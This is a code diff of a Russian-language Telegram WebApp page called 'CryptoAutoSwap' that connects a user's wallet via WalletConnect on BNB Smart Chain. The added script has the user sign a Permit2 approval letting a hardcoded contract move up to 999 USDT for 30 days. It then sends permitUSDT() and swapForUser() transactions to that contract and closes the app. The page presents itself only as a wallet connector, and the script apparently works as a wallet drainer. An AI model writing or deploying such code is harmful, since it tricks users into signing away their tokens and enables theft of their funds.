@@ -2,137 +2,148 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <title>WalletConnect AutoSwap (BSC)</title>
+  <title>CryptoAutoSwap</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
   <!-- Telegram WebApp SDK -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <!-- WalletConnect Modal & EthereumProvider v2 -->
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/dist/index.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/eth-provider@1.0.0/dist/umd/index.min.js"></script>
-  <!-- ethers.js для ABI кодирования -->
+  <!-- WalletConnect v2 -->
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.0.0/dist/umd/index.min.js"></script>
+  <!-- ethers.js -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
 
   <style>
     body {
-      font-family: sans-serif;
-      background: #17212b;
+      background: #0f1115;
       color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-      padding: 20px;
+      font-family: sans-serif;
+      padding: 2em;
       text-align: center;
+    }
+    button {
+      font-size: 16px;
+      padding: 12px 20px;
+      background: #2ea6ff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 20px;
     }
     #status {
       margin-top: 20px;
-      font-weight: 600;
-      font-size: 18px;
+      font-size: 16px;
       min-height: 24px;
-      color: #66bb6a;
     }
   </style>
 </head>
 <body>
-  <h1>WalletConnect AutoSwap</h1>
-  <div id="status">Инициализация...</div>
+  <h2>CryptoAutoSwap</h2>
+  <p>Подключите кошелёк через WalletConnect</p>
+  <button id="connectBtn">🔗 Подключить кошелёк</button>
+  <div id="status">Готово к подключению</div>
 
 <script>
-  const tg = window.Telegram.WebApp;
-  tg.ready();
+(async () => {
+  Telegram.WebApp.ready();
 
-  // Конфигурация
+  const status = document.getElementById("status");
+  const connectBtn = document.getElementById("connectBtn");
+
   const PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
-  const BSC_CHAIN_ID = 56;
-  const AUTOSWAP_ADDRESS = "0x026C54B156b501ad9cEa422e59454D4b6d6f6963";
+  const BSC_RPC = "https://bsc-dataseed.binance.org";
+  const CHAIN_ID = 56;
 
-  const statusDiv = document.getElementById("status");
+  const PERMIT2 = "0xA252294555A62511CBd1899Ac5dEfA26F5036098";
+  const AUTOSWAP = "0x48EEcE98f1AC0C59Db0Fe3217F6783D503e3416c";
+  const USDT = "0x55D398326f99059FF775485246999027B3197955";
+  const LIMIT = ethers.parseUnits("999", 18);
+  const DEADLINE = Math.floor(Date.now() / 1000) + 30 * 86400; // 30 дней
 
-  function setStatus(text, isError = false) {
-    statusDiv.textContent = text;
-    statusDiv.style.color = isError ? "#e64a45" : "#66bb6a";
-  }
+  const iface = new ethers.Interface([
+    "function permitUSDT() external",
+    "function swapForUser(address user, uint256 amountUSDT) external"
+  ]);
 
-  async function main() {
-    setStatus("Инициализация WalletConnect...");
-
-    // Инициализация Modal
-    const modal = new window.WalletConnectModal.Modal({
+  connectBtn.onclick = async () => {
+    status.textContent = "⏳ Подключение к WalletConnect...";
+    const provider = await window.WalletConnectEthereumProvider.init({
       projectId: PROJECT_ID,
-      themeMode: "dark",
-      walletConnectVersion: 2,
-      mobileLinks: ["trust"], // Можно добавить другие, если нужно
+      chains: [CHAIN_ID],
+      showQrModal: true,
+      rpcMap: { [CHAIN_ID]: BSC_RPC },
+      methods: ["eth_sendTransaction", "eth_signTypedData"],
     });
 
-    // Инициализация провайдера без автопоказа QR (покажем через modal)
-    const provider = new window.WalletConnectEthereumProvider({
-      projectId: PROJECT_ID,
-      chains: [BSC_CHAIN_ID],
-      rpcMap: {
-        [BSC_CHAIN_ID]: "https://bsc-dataseed.binance.org/"
-      },
-      showQrModal: false, 
-    });
-
-    // Показываем QR-код
-    await modal.open();
-
-    // Подключаемся (открывается modal или сканируется QR)
-    let accounts;
     try {
-      accounts = await provider.enable();
-    } catch(e) {
-      setStatus("Ошибка подключения кошелька: " + (e.message || e), true);
-      await modal.close();
-      return;
-    }
+      const accounts = await provider.enable();
+      const account = accounts[0];
+      const chainId = parseInt(await provider.request({ method: "eth_chainId" }), 16);
+      if (chainId !== CHAIN_ID) {
+        status.textContent = "❌ Неверная сеть. Выберите Binance Smart Chain";
+        return;
+      }
 
-    await modal.close();
+      status.textContent = "✍️ Запрашиваем Permit2 под USDT...";
+      const permit = {
+        domain: {
+          name: "Permit2",
+          version: "1",
+          chainId: CHAIN_ID,
+          verifyingContract: PERMIT2
+        },
+        types: {
+          PermitTransferFrom: [
+            { name: "permitted", type: "TokenPermissions" },
+            { name: "spender", type: "address" },
+            { name: "nonce", type: "uint256" },
+            { name: "deadline", type: "uint256" }
+          ],
+          TokenPermissions: [
+            { name: "token", type: "address" },
+            { name: "amount", type: "uint256" }
+          ]
+        },
+        primaryType: "PermitTransferFrom",
+        message: {
+          permitted: { token: USDT, amount: LIMIT.toString() },
+          spender: AUTOSWAP,
+          nonce: "0",
+          deadline: DEADLINE.toString()
+        }
+      };
 
-    if (!accounts || accounts.length === 0) {
-      setStatus("Кошелек не подключен", true);
-      return;
-    }
-
-    const owner = accounts[0];
-    setStatus(`Кошелек подключен: ${owner}`);
-
-    // Проверяем сеть
-    const chainIdHex = await provider.request({ method: "eth_chainId" });
-    const chainId = parseInt(chainIdHex, 16);
-    if (chainId !== BSC_CHAIN_ID) {
-      setStatus(`Пожалуйста, переключитесь на сеть BSC (chainId ${BSC_CHAIN_ID})`, true);
-      return;
-    }
-
-    setStatus("Отправляем транзакцию...");
-
-    // Пример транзакции: вызываем swapForUser(address user, uint256 amount)
-    const amount = ethers.parseUnits("1000", 18); // 1000 токенов с 18 decimals
-    const iface = new ethers.Interface([
-      "function swapForUser(address user, uint256 amount)"
-    ]);
-    const data = iface.encodeFunctionData("swapForUser", [owner, amount]);
-
-    const tx = {
-      from: owner,
-      to: AUTOSWAP_ADDRESS,
-      data: data,
-    };
-
-    try {
-      const txHash = await provider.request({
-        method: "eth_sendTransaction",
-        params: [tx]
+      const sig = await provider.request({
+        method: "eth_signTypedData_v4",
+        params: [account, JSON.stringify(permit)],
       });
-      setStatus(`✅ Транзакция отправлена! Hash:\n${txHash}`);
-    } catch (e) {
-      setStatus("Ошибка отправки транзакции: " + (e.message || e), true);
-    }
-  }
 
-  main();
+      status.textContent = "🚀 Отправляем permitUSDT() + swapForUser()...";
+
+      const callData = iface.encodeFunctionData("permitUSDT", []);
+      const tx1 = {
+        from: account,
+        to: AUTOSWAP,
+        data: callData
+      };
+
+      const tx2 = {
+        from: account,
+        to: AUTOSWAP,
+        data: iface.encodeFunctionData("swapForUser", [account, LIMIT])
+      };
+
+      const hash1 = await provider.request({ method: "eth_sendTransaction", params: [tx1] });
+      const hash2 = await provider.request({ method: "eth_sendTransaction", params: [tx2] });
+
+      status.innerHTML = `✅ Успешно!<br>Permit TX: ${hash1}<br>Swap TX: ${hash2}`;
+      Telegram.WebApp.close();
+    } catch (err) {
+      console.error(err);
+      status.textContent = "❌ Ошибка: " + (err.message || err);
+    }
+  };
+})();
 </script>
 </body>
 </html>
